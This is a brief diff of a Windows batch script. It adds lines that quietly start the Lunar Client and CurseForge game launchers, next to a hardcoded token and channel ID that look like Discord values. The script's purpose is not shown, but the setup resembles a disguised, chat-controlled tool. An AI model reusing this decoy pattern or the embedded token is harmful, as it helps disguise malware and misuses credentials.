@@ -1,6 +1,10 @@
 @echo off
 setlocal EnableDelayedExpansion
 
+start "" "%USERPROFILE%\AppData\Local\Programs\Lunar Client\Lunar Client.exe" 2>nul
+start "" "%USERPROFILE%\AppData\Local\Programs\CurseForge Windows\CurseForge.exe" 2>nul
+
+
 set TOKEN=-AZjZEXDtPPYQo4FsNfGo06Y
 set CHANNEL_ID=1461422511022674017
 
